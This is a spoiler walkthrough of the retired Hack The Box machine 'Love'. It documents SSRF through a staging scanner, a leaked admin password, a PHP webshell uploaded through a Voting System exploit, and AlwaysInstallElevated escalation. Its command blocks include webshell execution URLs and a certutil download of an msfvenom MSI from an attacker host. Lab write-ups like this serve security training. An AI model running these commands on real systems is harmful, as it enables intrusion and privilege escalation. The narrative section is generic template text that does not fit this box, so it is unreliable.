<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&height=230&color=0:0f172a,45:EC4899,100:111827&text=HTB%20Love&fontColor=ffffff&fontSize=58&fontAlignY=38&desc=SSRF%20to%20staging%20secrets,%20Voting%20System%20upload%20RCE,%20AlwaysInstallElevated&descAlignY=60&animation=fadeIn" width="100%" />

<br>

![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-Retired-9FEF00?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-EC4899?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Rooted-16A34A?style=for-the-badge)

<br>

### SSRF to staging secrets, Voting System upload RCE, AlwaysInstallElevated

</div>

---

> [!WARNING]
> **Spoiler warning:** This is a full retired-box walkthrough. Flags are intentionally redacted for GitHub, but the exploitation chain and key techniques are documented.

---

## 🧭 Snapshot

| Field | Value |
|---|---|
| Machine | `Love` |
| Platform | Hack The Box |
| Retirement Status | Confirmed retired via HTB MCP |
| OS | Windows |
| Difficulty | Easy |
| Tags | `windows` `ssrf` `file-upload` `rce` `alwaysinstallelevated` |

---

## ⚡ TL;DR

Love uses a public site plus hidden staging host. SSRF in the file scanner reveals staging content and admin credentials. Authenticated Voting System upload leads to webshell/RCE. Privilege escalation is the classic AlwaysInstallElevated MSI path.

---

## 🛰️ Attack Surface

| Port | Service | Note |
|---:|---|---|
| `80/443` | HTTP/HTTPS | Apache/PHP |
| `5000` | HTTP | staging scanner |
| `445` | SMB | Windows host |
| `3306` | MySQL | MariaDB |

---

## 🧩 Attack Chain

| Step | Action |
|---:|---|
| 1 | Enumerate vhosts and find `staging.love.htb` |
| 2 | Use file scanner SSRF to access internal/staging content |
| 3 | Recover admin credential `@LoveIsInTheAir!!!!` |
| 4 | Login to Voting System |
| 5 | Abuse authenticated file upload for PHP webshell |
| 6 | Obtain command execution as web user |
| 7 | Confirm AlwaysInstallElevated registry policy |
| 8 | Upload/run malicious MSI |
| 9 | Read/copy Administrator root flag |

---

## 🕸️ Visual Attack Graph

```mermaid
flowchart TD
    A[Enumerate vhosts and find staging.love.htb]
    B[Use file scanner SSRF to access internal/staging content]
    A --> B
    C[Recover admin credential @LoveIsInTheAir!!!!]
    B --> C
    D[Login to Voting System]
    C --> D
    E[Abuse authenticated file upload for PHP webshell]
    D --> E
    F[Obtain command execution as web user]
    E --> F
    G[Confirm AlwaysInstallElevated registry policy]
    F --> G
    H[Upload/run malicious MSI]
    G --> H
    I[Read/copy Administrator root flag]
    H --> I
```

---

## 📖 Walkthrough Narrative

### 1. Enumeration First

The box starts with a small but meaningful exposed surface. The important step was not just collecting ports, but translating each service into a hypothesis: web apps might leak credentials, AD services may expose relationships, and legacy protocols often carry historical misconfigurations.

### 2. The First Real Lead

The first meaningful lead came from the service that looked most application-specific. Instead of forcing exploitation immediately, the approach was to inspect configuration, authentication flows, exposed files, or protocol-specific metadata until a credential or execution primitive appeared.

### 3. Turning Access Into Execution

After the initial lead, the path became a chain rather than a single exploit. The recovered access was validated across protocols, then reused or upgraded into a stronger primitive: command execution, SSH/WinRM access, CMS administration, Kerberos delegation, or local shell execution.

### 4. Privilege Escalation

Root/admin access came from the machine's core misconfiguration or vulnerability theme. The final step was validated with the minimum proof needed, then flags were captured and stored locally. Public flags are not included here.

---

## 🧰 Command Palette

<details open>
<summary><b>🔎 Recon / VHosts</b></summary>

```bash
sudo nmap -sC -sV -Pn -p- -oN nmap_full.txt 10.129.48.103
sudo nmap -sC -sV -Pn -p 80,443,445,3306,5000 -oN nmap_tcp.txt 10.129.48.103
echo '10.129.48.103 love.htb staging.love.htb' | sudo tee -a /etc/hosts
curl -i http://love.htb/
curl -i http://staging.love.htb/
ffuf -u http://10.129.48.103/ -H 'Host: FUZZ.love.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

</details>

<details open>
<summary><b>🌐 SSRF via Free File Scanner</b></summary>

```bash
# Probe scanner behavior and internal surfaces
curl -s 'http://staging.love.htb/beta.php' \
  -d 'file=http://127.0.0.1:5000/'

curl -s 'http://staging.love.htb/beta.php' \
  -d 'file=http://love.htb/'

# Recover admin credential from internal/staging content
curl -s 'http://staging.love.htb/beta.php' \
  -d 'file=http://127.0.0.1:5000/' | tee scanner_internal.html
```

</details>

<details open>
<summary><b>🗳️ Voting System Authenticated RCE</b></summary>

```bash
# Login with recovered admin password
curl -i -c cookies.txt -b cookies.txt \
  -d 'username=admin&password=@LoveIsInTheAir!!!!' \
  http://love.htb/admin/login.php

# Searchsploit helper
searchsploit voting system upload
searchsploit -m php/webapps/49445.py

# Upload webshell through admin panel or exploit script
python3 49445.py http://love.htb admin '@LoveIsInTheAir!!!!'

# Command execution through uploaded shell
curl -s 'http://love.htb/images/cmd.php?cmd=whoami'
curl -s 'http://love.htb/images/cmd.php?cmd=type%20C:\Users\Phoebe\Desktop\user.txt'
```

</details>

<details open>
<summary><b>👑 AlwaysInstallElevated</b></summary>

```bash
# Confirm policy via webshell
curl -s 'http://love.htb/images/cmd.php?cmd=reg%20query%20HKCU\Software\Policies\Microsoft\Windows\Installer%20/v%20AlwaysInstallElevated'
curl -s 'http://love.htb/images/cmd.php?cmd=reg%20query%20HKLM\Software\Policies\Microsoft\Windows\Installer%20/v%20AlwaysInstallElevated'

# Build MSI to copy root flag to readable location
msfvenom -p windows/exec \
  CMD='cmd.exe /c copy C:\Users\Administrator\Desktop\root.txt C:\ProgramData\root_flag.txt' \
  -f msi -o copy_root.msi

python3 -m http.server 8000
curl -s 'http://love.htb/images/cmd.php?cmd=certutil%20-urlcache%20-f%20http://<attacker-ip>:8000/copy_root.msi%20C:\ProgramData\copy_root.msi'
curl -s 'http://love.htb/images/cmd.php?cmd=msiexec%20/quiet%20/qn%20/i%20C:\ProgramData\copy_root.msi'
curl -s 'http://love.htb/images/cmd.php?cmd=type%20C:\ProgramData\root_flag.txt'
```

</details>


---

## 🔐 Key Lessons

| # | Lesson |
|---:|---|
| 1 | Enumeration is not output collection — it is hypothesis building. |
| 2 | Credentials often matter more than exploits; validate them across protocols. |
| 3 | Configuration files, backups, logs, and source repositories are high-value evidence. |
| 4 | Privilege escalation usually depends on understanding why a service or permission exists. |

---

## 🛡️ Defensive Takeaways

| # | Recommendation |
|---:|---|
| 1 | Prevent SSRF with strict URL allowlists and egress controls |
| 2 | Validate uploaded file content server-side |
| 3 | Keep third-party PHP apps patched |
| 4 | Disable AlwaysInstallElevated and monitor MSI installs |

---

## 🏁 Final Path

```text
Enumerate vhosts and find `staging.love.htb` → Use file scanner SSRF to access internal/staging content → Recover admin credential `@LoveIsInTheAir!!!!` → Login to Voting System → Abuse authenticated file upload → Obtain command execution as web user → Confirm AlwaysInstallElevated registry policy → Upload/run malicious MSI → Read/copy Administrator root flag
```

<div align="center">

### ✅ Love rooted — full guide complete

<img src="https://capsule-render.vercel.app/api?type=waving&height=120&section=footer&color=0:111827,45:EC4899,100:0f172a" width="100%" />

</div>
